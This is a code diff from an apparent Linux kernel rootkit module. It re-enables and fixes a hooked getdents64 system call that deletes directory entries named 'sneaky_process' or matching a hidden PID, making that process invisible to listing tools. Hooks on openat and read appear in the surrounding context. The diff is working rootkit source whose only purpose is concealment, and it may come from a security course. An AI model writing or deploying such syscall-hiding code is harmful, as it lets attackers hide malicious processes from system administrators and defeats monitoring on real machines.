@@ -66,13 +66,13 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
-/*asmlinkage long (*original_getdents64)(struct pt_regs *);                                                                                                                         
+asmlinkage long (*original_getdents64)(struct pt_regs *);                                                                                                                         
                                                                                                                                                                                     
 asmlinkage long sneaky_sys_getdents(struct pt_regs *regs)                                                                                                                           
 {                                                                                                                                                                                   
                                                                                                                                                                                     
   long bytes_read;                                                                                                                                                                  
-  struct linux_dirent64 __user *head;                                                                                                                                               
+  struct linux_dirent64 *head;                                                                                                                                               
   unsigned long pos = 0;                                                                                                                                                            
   char *sneaky_name = "sneaky_process";                                                                                                                                             
   size_t sneaky_sz = strlen(sneaky_name);                                                                                                                                           
@@ -93,20 +93,19 @@ asmlinkage long sneaky_sys_getdents(struct pt_regs *regs)
                                                                                                                                                                                     
       if (strncmp(cur->d_name, sneaky_name, sneaky_sz) == 0 ||                                                                                                                           
           strncmp(cur->d_name, sneaky_pid, pid_sz) == 0) {                                                                                                                                                                                                                                                                                                                                                         
-        void *end = (char *)cur + cur->d_reclen;                                                                                                                                            
+        char *end = (char *)cur + cur->d_reclen;                                                                                                                                            
         size_t n_bytes = bytes_read - (pos + cur->d_reclen);                                                                                                                        
-        memmove(cur, end, n_bytes);                                                                                                                                                 
+        memmove((char *)cur, (char *)end, n_bytes);                                                                                                                                                 
         bytes_read -= cur->d_reclen;                                                                                                                                                                                                                                                                                                                     
       }                                                                                                                                                                             
       else                                                                                                                                                                          
       {                                                                                                                                                                             
-        //pos = pos + cur->d_reclen;                                                                                                                                                
-        pos++;                                                                                                                                                                      
+        pos = pos + cur->d_reclen;                                                                                                                                                                                                                                                                                                                     
       }                                                                                                                                                                             
     }                                                                                                                                                                               
   }                                                                                                                                                                                 
   return bytes_read;                                                                                                                                                                
-}*/
+}
 
 asmlinkage long (*original_read)(struct pt_regs *);
 
